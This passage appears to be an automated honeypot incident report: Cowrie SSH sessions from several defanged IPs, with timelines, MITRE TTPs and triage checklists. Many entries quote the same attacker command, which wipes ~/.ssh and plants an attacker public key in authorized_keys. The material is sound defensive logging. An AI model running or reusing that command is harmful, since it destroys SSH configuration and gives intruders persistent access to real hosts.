| **First Seen** | 2026-06-01 12:07 |
| **Last Seen** | 2026-06-01 12:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 12:07:15` | `cowrie.session.connect` |
| `2026-06-01 12:07:15` | `cowrie.client.version` |
| `2026-06-01 12:07:15` | `cowrie.client.kex` |
| `2026-06-01 12:07:15` | `cowrie.login.success` |
| `2026-06-01 12:07:16` | `cowrie.session.params` |
| `2026-06-01 12:07:16` | `cowrie.command.input` |
| `2026-06-01 12:07:16` | `cowrie.command.failed` |
| `2026-06-01 12:07:16` | `cowrie.log.closed` |
| `2026-06-01 12:07:16` | `cowrie.session.params` |
| `2026-06-01 12:07:16` | `cowrie.command.input` |
| `2026-06-01 12:07:16` | `cowrie.session.file_download` |
| `2026-06-01 12:07:16` | `cowrie.log.closed` |
| `2026-06-01 12:07:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.167[.]192` to AbuseIPDB if not already reported
- [ ] Block `101.79.167[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aca1a9f8047e

| Field | Detail |
|---|---|
| **Source IP** | `101.79.167[.]192` |
| **First Seen** | 2026-06-01 12:07 |
| **Last Seen** | 2026-06-01 12:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 12:07:18` | `cowrie.session.connect` |
| `2026-06-01 12:07:18` | `cowrie.client.version` |
| `2026-06-01 12:07:18` | `cowrie.client.kex` |
| `2026-06-01 12:07:19` | `cowrie.login.success` |
| `2026-06-01 12:07:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.167[.]192` to AbuseIPDB if not already reported
- [ ] Block `101.79.167[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88bfbf17d3b2

| Field | Detail |
|---|---|
| **Source IP** | `101.79.167[.]192` |
| **First Seen** | 2026-06-01 12:09 |
| **Last Seen** | 2026-06-01 12:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 12:09:08` | `cowrie.session.connect` |
| `2026-06-01 12:09:08` | `cowrie.client.version` |
| `2026-06-01 12:09:08` | `cowrie.client.kex` |
| `2026-06-01 12:09:08` | `cowrie.login.success` |
| `2026-06-01 12:09:08` | `cowrie.session.params` |
| `2026-06-01 12:09:08` | `cowrie.command.input` |
| `2026-06-01 12:09:08` | `cowrie.command.failed` |
| `2026-06-01 12:09:09` | `cowrie.log.closed` |
| `2026-06-01 12:09:09` | `cowrie.session.params` |
| `2026-06-01 12:09:09` | `cowrie.command.input` |
| `2026-06-01 12:09:09` | `cowrie.session.file_download` |
| `2026-06-01 12:09:09` | `cowrie.log.closed` |
| `2026-06-01 12:09:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.167[.]192` to AbuseIPDB if not already reported
- [ ] Block `101.79.167[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d23cf742760

| Field | Detail |
|---|---|
| **Source IP** | `101.79.167[.]192` |
| **First Seen** | 2026-06-01 12:09 |
| **Last Seen** | 2026-06-01 12:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 12:09:11` | `cowrie.session.connect` |
| `2026-06-01 12:09:11` | `cowrie.client.version` |
| `2026-06-01 12:09:11` | `cowrie.client.kex` |
| `2026-06-01 12:09:11` | `cowrie.login.success` |
| `2026-06-01 12:09:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.167[.]192` to AbuseIPDB if not already reported
- [ ] Block `101.79.167[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42aa8b7a503b

| Field | Detail |
|---|---|
| **Source IP** | `104.28.245[.]40` |
| **First Seen** | 2026-06-01 12:24 |
| **Last Seen** | 2026-06-01 12:25 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 12:24:59` | `cowrie.session.connect` |
| `2026-06-01 12:25:00` | `cowrie.client.version` |
| `2026-06-01 12:25:00` | `cowrie.client.kex` |
| `2026-06-01 12:25:01` | `cowrie.login.success` |
| `2026-06-01 12:25:02` | `cowrie.session.params` |
| `2026-06-01 12:25:02` | `cowrie.command.input` |
| `2026-06-01 12:25:02` | `cowrie.command.failed` |
| `2026-06-01 12:25:02` | `cowrie.log.closed` |
| `2026-06-01 12:25:03` | `cowrie.session.params` |
| `2026-06-01 12:25:03` | `cowrie.command.input` |
| `2026-06-01 12:25:03` | `cowrie.session.file_download` |
| `2026-06-01 12:25:03` | `cowrie.log.closed` |
| `2026-06-01 12:25:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.28.245[.]40` to AbuseIPDB if not already reported
- [ ] Block `104.28.245[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3912cc5cae15

| Field | Detail |
|---|---|
| **Source IP** | `104.28.245[.]40` |
| **First Seen** | 2026-06-01 12:25 |
| **Last Seen** | 2026-06-01 12:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 12:25:17` | `cowrie.session.connect` |
| `2026-06-01 12:25:17` | `cowrie.client.version` |
| `2026-06-01 12:25:17` | `cowrie.client.kex` |
| `2026-06-01 12:25:18` | `cowrie.login.success` |
| `2026-06-01 12:25:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.28.245[.]40` to AbuseIPDB if not already reported
- [ ] Block `104.28.245[.]40` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f200f64525e

| Field | Detail |
|---|---|
| **Source IP** | `103.186.1[.]59` |
| **First Seen** | 2026-06-01 12:28 |
| **Last Seen** | 2026-06-01 12:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 12:28:34` | `cowrie.session.connect` |
| `2026-06-01 12:28:34` | `cowrie.client.version` |
| `2026-06-01 12:28:34` | `cowrie.client.kex` |
| `2026-06-01 12:28:35` | `cowrie.login.success` |
| `2026-06-01 12:28:36` | `cowrie.session.params` |
| `2026-06-01 12:28:36` | `cowrie.command.input` |
| `2026-06-01 12:28:36` | `cowrie.command.failed` |
| `2026-06-01 12:28:36` | `cowrie.log.closed` |
| `2026-06-01 12:28:36` | `cowrie.session.params` |
| `2026-06-01 12:28:36` | `cowrie.command.input` |
| `2026-06-01 12:28:36` | `cowrie.session.file_download` |
| `2026-06-01 12:28:36` | `cowrie.log.closed` |
| `2026-06-01 12:28:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.186.1[.]59` to AbuseIPDB if not already reported
- [ ] Block `103.186.1[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe292d8ef479

| Field | Detail |
|---|---|
| **Source IP** | `103.186.1[.]59` |
| **First Seen** | 2026-06-01 12:28 |
| **Last Seen** | 2026-06-01 12:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 12:28:39` | `cowrie.session.connect` |
| `2026-06-01 12:28:39` | `cowrie.client.version` |
| `2026-06-01 12:28:39` | `cowrie.client.kex` |
| `2026-06-01 12:28:40` | `cowrie.login.success` |
| `2026-06-01 12:28:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.186.1[.]59` to AbuseIPDB if not already reported
- [ ] Block `103.186.1[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8e45fb3e444

| Field | Detail |
|---|---|
| **Source IP** | `61.76.112[.]4` |
| **First Seen** | 2026-06-01 12:29 |
| **Last Seen** | 2026-06-01 12:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 12:29:38` | `cowrie.session.connect` |
| `2026-06-01 12:29:38` | `cowrie.client.version` |
| `2026-06-01 12:29:38` | `cowrie.client.kex` |
| `2026-06-01 12:29:39` | `cowrie.login.success` |
| `2026-06-01 12:29:39` | `cowrie.session.params` |
| `2026-06-01 12:29:39` | `cowrie.command.input` |
| `2026-06-01 12:29:39` | `cowrie.command.failed` |
| `2026-06-01 12:29:39` | `cowrie.log.closed` |
| `2026-06-01 12:29:40` | `cowrie.session.params` |
| `2026-06-01 12:29:40` | `cowrie.command.input` |
| `2026-06-01 12:29:40` | `cowrie.session.file_download` |
| `2026-06-01 12:29:40` | `cowrie.log.closed` |
| `2026-06-01 12:29:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.76.112[.]4` to AbuseIPDB if not already reported
- [ ] Block `61.76.112[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9035ea1eb86a

| Field | Detail |
|---|---|
| **Source IP** | `61.76.112[.]4` |
| **First Seen** | 2026-06-01 12:29 |
| **Last Seen** | 2026-06-01 12:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 12:29:42` | `cowrie.session.connect` |
| `2026-06-01 12:29:42` | `cowrie.client.version` |
| `2026-06-01 12:29:42` | `cowrie.client.kex` |
| `2026-06-01 12:29:43` | `cowrie.login.success` |
| `2026-06-01 12:29:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.76.112[.]4` to AbuseIPDB if not already reported
- [ ] Block `61.76.112[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41c397b30647

| Field | Detail |
|---|---|
| **Source IP** | `61.76.112[.]4` |
| **First Seen** | 2026-06-01 12:37 |
| **Last Seen** | 2026-06-01 12:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 12:37:11` | `cowrie.session.connect` |
| `2026-06-01 12:37:11` | `cowrie.client.version` |
| `2026-06-01 12:37:11` | `cowrie.client.kex` |
| `2026-06-01 12:37:12` | `cowrie.login.success` |
| `2026-06-01 12:37:12` | `cowrie.session.params` |
| `2026-06-01 12:37:12` | `cowrie.command.input` |
| `2026-06-01 12:37:12` | `cowrie.command.failed` |
| `2026-06-01 12:37:12` | `cowrie.log.closed` |
| `2026-06-01 12:37:12` | `cowrie.session.params` |
| `2026-06-01 12:37:12` | `cowrie.command.input` |
| `2026-06-01 12:37:13` | `cowrie.session.file_download` |
| `2026-06-01 12:37:13` | `cowrie.log.closed` |
| `2026-06-01 12:37:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.76.112[.]4` to AbuseIPDB if not already reported
- [ ] Block `61.76.112[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2070b04f1829

| Field | Detail |
|---|---|
| **Source IP** | `61.76.112[.]4` |
| **First Seen** | 2026-06-01 12:37 |
| **Last Seen** | 2026-06-01 12:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 12:37:15` | `cowrie.session.connect` |
| `2026-06-01 12:37:15` | `cowrie.client.version` |
| `2026-06-01 12:37:15` | `cowrie.client.kex` |
| `2026-06-01 12:37:15` | `cowrie.login.success` |
| `2026-06-01 12:37:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.76.112[.]4` to AbuseIPDB if not already reported
- [ ] Block `61.76.112[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1900bb902100

| Field | Detail |
|---|---|
| **Source IP** | `61.76.112[.]4` |
| **First Seen** | 2026-06-01 12:44 |
| **Last Seen** | 2026-06-01 12:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 12:44:14` | `cowrie.session.connect` |
| `2026-06-01 12:44:14` | `cowrie.client.version` |
| `2026-06-01 12:44:14` | `cowrie.client.kex` |
| `2026-06-01 12:44:14` | `cowrie.login.success` |
| `2026-06-01 12:44:15` | `cowrie.session.params` |
| `2026-06-01 12:44:15` | `cowrie.command.input` |
| `2026-06-01 12:44:15` | `cowrie.command.failed` |
| `2026-06-01 12:44:15` | `cowrie.log.closed` |
| `2026-06-01 12:44:15` | `cowrie.session.params` |
| `2026-06-01 12:44:15` | `cowrie.command.input` |
| `2026-06-01 12:44:15` | `cowrie.session.file_download` |
| `2026-06-01 12:44:15` | `cowrie.log.closed` |
| `2026-06-01 12:44:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.76.112[.]4` to AbuseIPDB if not already reported
- [ ] Block `61.76.112[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-473b1d3fd0db

| Field | Detail |
|---|---|
| **Source IP** | `61.76.112[.]4` |
| **First Seen** | 2026-06-01 12:44 |
| **Last Seen** | 2026-06-01 12:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 12:44:18` | `cowrie.session.connect` |
| `2026-06-01 12:44:18` | `cowrie.client.version` |
| `2026-06-01 12:44:18` | `cowrie.client.kex` |
| `2026-06-01 12:44:18` | `cowrie.login.success` |
| `2026-06-01 12:44:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.76.112[.]4` to AbuseIPDB if not already reported
- [ ] Block `61.76.112[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ee660ae5250

| Field | Detail |
|---|---|
| **Source IP** | `61.76.112[.]4` |
| **First Seen** | 2026-06-01 12:51 |
| **Last Seen** | 2026-06-01 12:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 12:51:39` | `cowrie.session.connect` |
| `2026-06-01 12:51:39` | `cowrie.client.version` |
| `2026-06-01 12:51:39` | `cowrie.client.kex` |
| `2026-06-01 12:51:40` | `cowrie.login.success` |
| `2026-06-01 12:51:40` | `cowrie.session.params` |
| `2026-06-01 12:51:40` | `cowrie.command.input` |
| `2026-06-01 12:51:40` | `cowrie.command.failed` |
| `2026-06-01 12:51:40` | `cowrie.log.closed` |
| `2026-06-01 12:51:40` | `cowrie.session.params` |
| `2026-06-01 12:51:40` | `cowrie.command.input` |
| `2026-06-01 12:51:41` | `cowrie.session.file_download` |
| `2026-06-01 12:51:41` | `cowrie.log.closed` |
| `2026-06-01 12:51:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.76.112[.]4` to AbuseIPDB if not already reported
- [ ] Block `61.76.112[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad694a939246

| Field | Detail |
|---|---|
| **Source IP** | `61.76.112[.]4` |
| **First Seen** | 2026-06-01 12:51 |
| **Last Seen** | 2026-06-01 12:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 12:51:43` | `cowrie.session.connect` |
| `2026-06-01 12:51:43` | `cowrie.client.version` |
| `2026-06-01 12:51:43` | `cowrie.client.kex` |
| `2026-06-01 12:51:43` | `cowrie.login.success` |
| `2026-06-01 12:51:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.76.112[.]4` to AbuseIPDB if not already reported
- [ ] Block `61.76.112[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e4a31340eb6

| Field | Detail |
|---|---|
| **Source IP** | `61.76.112[.]4` |
| **First Seen** | 2026-06-01 12:56 |
| **Last Seen** | 2026-06-01 12:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 12:56:25` | `cowrie.session.connect` |
| `2026-06-01 12:56:25` | `cowrie.client.version` |
| `2026-06-01 12:56:26` | `cowrie.client.kex` |
